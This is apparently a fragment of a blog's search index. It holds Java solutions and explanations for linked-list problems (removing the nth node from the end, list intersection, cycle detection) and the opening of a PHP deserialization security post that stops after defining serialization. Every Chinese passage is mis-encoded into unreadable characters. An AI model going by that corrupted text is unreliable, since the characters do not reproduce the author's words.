class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ­¤æ—¶ slowIndex çš„ä½ç½®å°±æ˜¯å¾…åˆ é™¤å…ƒç´ çš„å‰ä¸€ä¸ªä½ç½®ã€‚</span></span><br><span class="line">        <span class="comment">// å…·ä½“æƒ…å†µå¯è‡ªå·±ç”»ä¸€ä¸ªé“¾è¡¨é•¿åº¦ä¸º 3 çš„å›¾æ¥æ¨¡æ‹Ÿä»£ç æ¥ç†è§£</span></span><br><span class="line">        <span class="comment">// æ£€æŸ¥ slowIndex.next æ˜¯å¦ä¸º nullï¼Œä»¥é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span>(slow.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow.next = slow.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘åˆè‡ªå·±å†™äº†ä¸ªï¼ŒæŒ‰ç…§æˆ‘åŸæ¥çš„æ€è·¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ­¤æ—¶ slowIndex çš„ä½ç½®å°±æ˜¯å¾…åˆ é™¤å…ƒç´ çš„å‰ä¸€ä¸ªä½ç½®ã€‚</span></span><br><span class="line">        <span class="comment">// å…·ä½“æƒ…å†µå¯è‡ªå·±ç”»ä¸€ä¸ªé“¾è¡¨é•¿åº¦ä¸º 3 çš„å›¾æ¥æ¨¡æ‹Ÿä»£ç æ¥ç†è§£</span></span><br><span class="line">        <span class="comment">// æ£€æŸ¥ slowIndex.next æ˜¯å¦ä¸º nullï¼Œä»¥é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸</span></span><br><span class="line">        slow.next = slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢è¯•é¢˜-02-07-é“¾è¡¨ç›¸äº¤"><a href="#é¢è¯•é¢˜-02-07-é“¾è¡¨ç›¸äº¤" class="headerlink" title="é¢è¯•é¢˜ 02.07. é“¾è¡¨ç›¸äº¤"></a>é¢è¯•é¢˜ 02.07. é“¾è¡¨ç›¸äº¤</h2><p><img src="/2024/09/11/algorithm/List/image-1.png"><br>æ€è·¯æ˜¯å…ˆè®©é“¾è¡¨æŒ‡é’ˆç§»åŠ¨åˆ°å‰©ä½™é•¿åº¦ç›¸åŒçš„ä½ç½®ï¼Œç„¶åè®©ä¸¤ä¸ªé“¾è¡¨åŒæ—¶ç§»åŠ¨ï¼Œç›´åˆ°é‡åˆ°ç›¸åŒçš„èŠ‚ç‚¹ï¼Œæˆ–è€…é‡åˆ°nullã€‚æ³¨æ„è¿™é“é¢˜ç›¸äº¤èŠ‚ç‚¹å¤„æŒ‡é’ˆæ˜¯ç›¸åŒçš„ï¼Œæˆ‘å¼€å§‹è¿˜åœ¨æƒ³è¿˜è¦å¯¹æ¯”åé¢çš„èŠ‚ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curA</span> <span class="operator">=</span> headA;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curB</span> <span class="operator">=</span> headB;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lenA</span> <span class="operator">=</span> <span class="number">0</span>, lenB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenA++;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(curB != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenB++;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        curA = headA;</span><br><span class="line">        curB = headB;</span><br><span class="line">        <span class="keyword">if</span>(lenB &gt; lenA)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmpLen</span> <span class="operator">=</span> lenA;</span><br><span class="line">            lenA = lenB;</span><br><span class="line">            lenB = tmpLen;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmpNode</span> <span class="operator">=</span> curA;</span><br><span class="line">            curA = curB;</span><br><span class="line">            curB = tmpNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ±‚é•¿åº¦å·®</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> lenA - lenB;</span><br><span class="line">        <span class="comment">// è®©curAå’ŒcurBåœ¨åŒä¸€èµ·ç‚¹ä¸Š</span></span><br><span class="line">        <span class="keyword">while</span>(gap-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(curA == curB)&#123;</span><br><span class="line">                <span class="keyword">return</span> curA;</span><br><span class="line">            &#125;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ç‰ˆæœ¬æ˜¯åŒæ­¥èµ°çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//åˆå¹¶é“¾è¡¨åŒæ­¥ç§»åŠ¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">       <span class="comment">// p1æŒ‡å‘Aé“¾è¡¨å¤´èŠ‚ç‚¹ï¼Œp2æŒ‡å‘Bé“¾è¡¨å¤´èŠ‚ç‚¹</span></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">       <span class="keyword">while</span>(p1 != p2)&#123;</span><br><span class="line">        <span class="comment">// p1èµ°ä¸€æ­¥ï¼Œå¦‚æœèµ°åˆ°Aé“¾è¡¨æœ«å°¾ï¼Œè½¬åˆ°Bé“¾è¡¨</span></span><br><span class="line">        <span class="keyword">if</span>(p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span> p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2èµ°ä¸€æ­¥ï¼Œå¦‚æœèµ°åˆ°Bé“¾è¡¨æœ«å°¾ï¼Œè½¬åˆ°Aé“¾è¡¨</span></span><br><span class="line">        <span class="keyword">if</span>(p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span> p2 = p2.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="142-ç¯å½¢é“¾è¡¨II"><a href="#142-ç¯å½¢é“¾è¡¨II" class="headerlink" title="142.ç¯å½¢é“¾è¡¨II"></a>142.ç¯å½¢é“¾è¡¨II</h2><p>åˆ¤æ–­é“¾è¡¨æ˜¯å¦æœ‰ç¯<br>å¯ä»¥ä½¿ç”¨å¿«æ…¢æŒ‡é’ˆæ³•ï¼Œåˆ†åˆ«å®šä¹‰ fast å’Œ slow æŒ‡é’ˆï¼Œä»å¤´ç»“ç‚¹å‡ºå‘ï¼ŒfastæŒ‡é’ˆæ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼ŒslowæŒ‡é’ˆæ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœ fast å’Œ slowæŒ‡é’ˆåœ¨é€”ä¸­ç›¸é‡ ï¼Œè¯´æ˜è¿™ä¸ªé“¾è¡¨æœ‰ç¯ã€‚<br>ä¸ºä»€ä¹ˆfast èµ°ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œslowèµ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæœ‰ç¯çš„è¯ï¼Œä¸€å®šä¼šåœ¨ç¯å†…ç›¸é‡å‘¢ï¼Œè€Œä¸æ˜¯æ°¸è¿œçš„é”™å¼€å‘¢<br>é¦–å…ˆç¬¬ä¸€ç‚¹ï¼šfastæŒ‡é’ˆä¸€å®šå…ˆè¿›å…¥ç¯ä¸­ï¼Œå¦‚æœfastæŒ‡é’ˆå’ŒslowæŒ‡é’ˆç›¸é‡çš„è¯ï¼Œä¸€å®šæ˜¯åœ¨ç¯ä¸­ç›¸é‡ï¼Œè¿™æ˜¯æ¯‹åº¸ç½®ç–‘çš„ã€‚<br>é‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆfastæŒ‡é’ˆå’ŒslowæŒ‡é’ˆä¸€å®šä¼šç›¸é‡å‘¢ï¼Ÿ<br>å¯ä»¥ç”»ä¸€ä¸ªç¯ï¼Œç„¶åè®© fastæŒ‡é’ˆåœ¨ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹è¿½èµ¶slowæŒ‡é’ˆã€‚è¿™æ˜¯å› ä¸ºfastæ˜¯èµ°ä¸¤æ­¥ï¼Œslowæ˜¯èµ°ä¸€æ­¥ï¼Œå…¶å®ç›¸å¯¹äºslowæ¥è¯´ï¼Œfastæ˜¯ä¸€ä¸ªèŠ‚ç‚¹ä¸€ä¸ªèŠ‚ç‚¹çš„é è¿‘slowçš„ï¼Œæ‰€ä»¥fastä¸€å®šå¯ä»¥å’Œslowé‡åˆã€‚</p><p>å¦‚æœæœ‰ç¯ï¼Œå¦‚ä½•æ‰¾åˆ°è¿™ä¸ªç¯çš„å…¥å£<br>æ­¤æ—¶å·²ç»å¯ä»¥åˆ¤æ–­é“¾è¡¨æ˜¯å¦æœ‰ç¯äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦æ‰¾è¿™ä¸ªç¯çš„å…¥å£äº†ã€‚<br>å‡è®¾ä»å¤´ç»“ç‚¹åˆ°ç¯å½¢å…¥å£èŠ‚ç‚¹ çš„èŠ‚ç‚¹æ•°ä¸ºxã€‚ ç¯å½¢å…¥å£èŠ‚ç‚¹åˆ° fastæŒ‡é’ˆä¸slowæŒ‡é’ˆç›¸é‡èŠ‚ç‚¹ èŠ‚ç‚¹æ•°ä¸ºyã€‚ ä»ç›¸é‡èŠ‚ç‚¹ å†åˆ°ç¯å½¢å…¥å£èŠ‚ç‚¹èŠ‚ç‚¹æ•°ä¸º zã€‚<br>é‚£ä¹ˆç›¸é‡æ—¶ï¼š slowæŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ•°ä¸º: x + yï¼Œ fastæŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ•°ï¼šx + y + n (y + z)ï¼Œnä¸ºfastæŒ‡é’ˆåœ¨ç¯å†…èµ°äº†nåœˆæ‰é‡åˆ°slowæŒ‡é’ˆï¼Œ ï¼ˆy+zï¼‰ä¸º ä¸€åœˆå†…èŠ‚ç‚¹çš„ä¸ªæ•°Aã€‚<br><img src="/2024/09/11/algorithm/List/image-2.png"><br>å› ä¸ºfastæŒ‡é’ˆæ˜¯ä¸€æ­¥èµ°ä¸¤ä¸ªèŠ‚ç‚¹ï¼ŒslowæŒ‡é’ˆä¸€æ­¥èµ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ æ‰€ä»¥ fastæŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ•° &#x3D; slowæŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ•° * 2ï¼š<br>(x + y) * 2 &#x3D; x + y + n (y + z)<br>ä¸¤è¾¹æ¶ˆæ‰ä¸€ä¸ªï¼ˆx+yï¼‰: x + y &#x3D; n (y + z)<br>å› ä¸ºè¦æ‰¾ç¯å½¢çš„å…¥å£ï¼Œé‚£ä¹ˆè¦æ±‚çš„æ˜¯xï¼Œå› ä¸ºxè¡¨ç¤º å¤´ç»“ç‚¹åˆ° ç¯å½¢å…¥å£èŠ‚ç‚¹çš„çš„è·ç¦»ã€‚<br>æ‰€ä»¥è¦æ±‚x ï¼Œå°†xå•ç‹¬æ”¾åœ¨å·¦é¢ï¼šx &#x3D; n (y + z) - y ,<br>å†ä»n(y+z)ä¸­æå‡ºä¸€ä¸ª ï¼ˆy+zï¼‰æ¥ï¼Œæ•´ç†å…¬å¼ä¹‹åä¸ºå¦‚ä¸‹å…¬å¼ï¼šx &#x3D; (n - 1) (y + z) + z æ³¨æ„è¿™é‡Œnä¸€å®šæ˜¯å¤§äºç­‰äº1çš„ï¼Œå› ä¸º fastæŒ‡é’ˆè‡³å°‘è¦å¤šèµ°ä¸€åœˆæ‰èƒ½ç›¸é‡slowæŒ‡é’ˆã€‚<br>è¿™ä¸ªå…¬å¼è¯´æ˜ä»€ä¹ˆå‘¢ï¼Ÿ<br>å…ˆæ‹¿nä¸º1çš„æƒ…å†µæ¥ä¸¾ä¾‹ï¼Œæ„å‘³ç€fastæŒ‡é’ˆåœ¨ç¯å½¢é‡Œè½¬äº†ä¸€åœˆä¹‹åï¼Œå°±é‡åˆ°äº† slowæŒ‡é’ˆäº†ã€‚<br>å½“ nä¸º1çš„æ—¶å€™ï¼Œå…¬å¼å°±åŒ–è§£ä¸º x &#x3D; zï¼Œ<br>è¿™å°±æ„å‘³ç€ï¼Œä»å¤´ç»“ç‚¹å‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œä»ç›¸é‡èŠ‚ç‚¹ ä¹Ÿå‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆæ¯æ¬¡åªèµ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ é‚£ä¹ˆå½“è¿™ä¸¤ä¸ªæŒ‡é’ˆç›¸é‡çš„æ—¶å€™å°±æ˜¯ ç¯å½¢å…¥å£çš„èŠ‚ç‚¹ã€‚<br>ä¹Ÿå°±æ˜¯åœ¨ç›¸é‡èŠ‚ç‚¹å¤„ï¼Œå®šä¹‰ä¸€ä¸ªæŒ‡é’ˆindex1ï¼Œåœ¨å¤´ç»“ç‚¹å¤„å®šä¸€ä¸ªæŒ‡é’ˆindex2ã€‚<br>è®©index1å’Œindex2åŒæ—¶ç§»åŠ¨ï¼Œæ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ é‚£ä¹ˆä»–ä»¬ç›¸é‡çš„åœ°æ–¹å°±æ˜¯ ç¯å½¢å…¥å£çš„èŠ‚ç‚¹ã€‚</p><p>é‚£ä¹ˆ nå¦‚æœå¤§äº1æ˜¯ä»€ä¹ˆæƒ…å†µå‘¢ï¼Œå°±æ˜¯fastæŒ‡é’ˆåœ¨ç¯å½¢è½¬nåœˆä¹‹åæ‰é‡åˆ° slowæŒ‡é’ˆã€‚<br>å…¶å®è¿™ç§æƒ…å†µå’Œnä¸º1çš„æ—¶å€™ æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œä¸€æ ·å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ‰¾åˆ° ç¯å½¢çš„å…¥å£èŠ‚ç‚¹ï¼Œåªä¸è¿‡ï¼Œindex1 æŒ‡é’ˆåœ¨ç¯é‡Œ å¤šè½¬äº†(n-1)åœˆï¼Œç„¶åå†é‡åˆ°index2ï¼Œç›¸é‡ç‚¹ä¾ç„¶æ˜¯ç¯å½¢çš„å…¥å£èŠ‚ç‚¹ã€‚</p><p>åœ¨æ¨ç†è¿‡ç¨‹ä¸­ï¼Œå¤§å®¶å¯èƒ½æœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯ï¼šä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡åœ¨ç¯ä¸­ç›¸é‡ï¼Œslowçš„ æ­¥æ•° æ˜¯ x+y è€Œä¸æ˜¯ x + è‹¥å¹²ç¯çš„é•¿åº¦ + y å‘¢ï¼Ÿ<br>é¦–å…ˆslowè¿›ç¯çš„æ—¶å€™ï¼Œfastä¸€å®šæ˜¯å…ˆè¿›ç¯æ¥äº†ã€‚<br>å¦‚æœslowè¿›ç¯å…¥å£ï¼Œfastä¹Ÿåœ¨ç¯å…¥å£ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªç¯å±•å¼€æˆç›´çº¿ï¼Œå°±æ˜¯å¦‚ä¸‹å›¾çš„æ ·å­ï¼š<br><img src="/2024/09/11/algorithm/List/image-3.png"><br>å¯ä»¥çœ‹å‡ºå¦‚æœslow å’Œ faståŒæ—¶åœ¨ç¯å…¥å£å¼€å§‹èµ°ï¼Œä¸€å®šä¼šåœ¨ç¯å…¥å£3ç›¸é‡ï¼Œslowèµ°äº†ä¸€åœˆï¼Œfastèµ°äº†ä¸¤åœˆã€‚<br>é‡ç‚¹æ¥äº†ï¼Œslowè¿›ç¯çš„æ—¶å€™ï¼Œfastä¸€å®šæ˜¯åœ¨ç¯çš„ä»»æ„ä¸€ä¸ªä½ç½®ï¼Œå¦‚å›¾ï¼š<br><img src="/2024/09/11/algorithm/List/image-4.png"><br>é‚£ä¹ˆfastæŒ‡é’ˆèµ°åˆ°ç¯å…¥å£3çš„æ—¶å€™ï¼Œå·²ç»èµ°äº†k + n ä¸ªèŠ‚ç‚¹ï¼Œslowç›¸åº”çš„åº”è¯¥èµ°äº†(k + n) &#x2F; 2 ä¸ªèŠ‚ç‚¹ã€‚<br>å› ä¸ºkæ˜¯å°äºnçš„ï¼ˆå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼‰ï¼Œæ‰€ä»¥(k + n) &#x2F; 2 ä¸€å®šå°äºnã€‚<br>ä¹Ÿå°±æ˜¯è¯´slowä¸€å®šæ²¡æœ‰èµ°åˆ°ç¯å…¥å£3ï¼Œè€Œfastå·²ç»åˆ°ç¯å…¥å£3äº†ã€‚<br>è¿™è¯´æ˜ä»€ä¹ˆå‘¢ï¼Ÿ<br>åœ¨slowå¼€å§‹èµ°çš„é‚£ä¸€ç¯å·²ç»å’Œfastç›¸é‡äº†ã€‚<br>é‚£æœ‰åŒå­¦åˆè¯´äº†ï¼Œä¸ºä»€ä¹ˆfastä¸èƒ½è·³è¿‡å»å‘¢ï¼Ÿ åœ¨åˆšåˆšå·²ç»è¯´è¿‡ä¸€æ¬¡äº†ï¼Œfastç›¸å¯¹äºslowæ˜¯ä¸€æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥ä¸å¯èƒ½è·³è¿‡å»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span>(slow == fast)&#123;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index1</span> <span class="operator">=</span> fast;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index2</span> <span class="operator">=</span> head;</span><br><span class="line">                <span class="keyword">while</span>(index1 != index2)&#123;</span><br><span class="line">                    index1 = index1.next;</span><br><span class="line">                    index2 = index2.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ©ç”¨å“ˆå¸Œè¡¨å®ç° éå¸¸ç›´è§‚çš„æ€è·¯æ˜¯ï¼šæˆ‘ä»¬éå†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å°†å®ƒè®°å½•ä¸‹æ¥ï¼›ä¸€æ—¦é‡åˆ°äº†æ­¤å‰éå†è¿‡çš„èŠ‚ç‚¹ï¼Œå°±å¯ä»¥åˆ¤å®šé“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚æ—¶é—´ç©ºé—´å¤æ‚åº¦éƒ½æ˜¯O(N)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pos</span> <span class="operator">=</span> head;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;ListNode&gt;();</span><br><span class="line">        <span class="keyword">while</span>(pos != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.contains(pos))&#123;</span><br><span class="line">                <span class="keyword">return</span> pos;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                visited.add(pos);</span><br><span class="line">            &#125;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/algorithm/List/image-5.png"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é“¾è¡¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘ååºåˆ—åŒ–æ¼æ´åˆ†æç¬”è®° - ç¬¬ä¸€éƒ¨åˆ† PHPååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/09/10/WebSecurity/owasptop/deserialization/"/>
      <url>/2024/09/10/WebSecurity/owasptop/deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ</h1><p>æˆ‘ä¸ªäººçš„ç†è§£æ˜¯ï¼šåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢ä¸ºå¯¹è±¡ã€‚ä¸ºä»€ä¹ˆä¼šæœ‰è¿™äº›æ¦‚å¿µå‘¢ï¼Ÿè¿˜æ˜¯æ¥æºäºå…·ä½“çš„éœ€æ±‚ï¼Œä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼Œæ¯”å¦‚ä¸€ä¸ªå…¬å¸è¦å¼€å‘ä¸€ä¸ªè½¯ä»¶ï¼Œè¿™ä¸ªè½¯ä»¶éœ€è¦ä¿å­˜ç”¨æˆ·çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿¡æ¯éœ€è¦æŒä¹…åŒ–å­˜å‚¨ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿¡æ¯æ€ä¹ˆå­˜å‚¨å‘¢ï¼Œè¿™äº›ä¿¡æ¯å¯èƒ½æ˜¯ä¸ªåœ¨ç¨‹åºè¿è¡Œæ—¶å¯èƒ½æ˜¯ä¸ªå¯¹è±¡ï¼Œç»è¿‡åºåˆ—åŒ–ä¹‹åï¼Œå°±å¯ä»¥å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆååºåˆ—åŒ–å°±æ˜¯å°†å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å¯¹è±¡ï¼Œæ¢å¤æˆå¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³å¯¹è±¡çš„æŒä¹…åŒ–å­˜å‚¨çš„é—®é¢˜ã€‚</p><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><p>ä¸ç®¡æ˜¯ä»€ä¹ˆè¯­è¨€çš„åºåˆ—åŒ–ï¼Œä»æ¦‚å¿µéœ€æ±‚å‡ºå‘ï¼Œå°±å¯ä»¥å†³å®šå‡ºåœºæ™¯ï¼šæ•°æ®å­˜å‚¨ã€ç½‘ç»œä¼ è¾“ã€é€šè¿‡ç‰¹å®šåè®®è¯»å–ã€‚</p><h2 id="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ä¼šå‡ºç°æ¼æ´ï¼Ÿ"><a 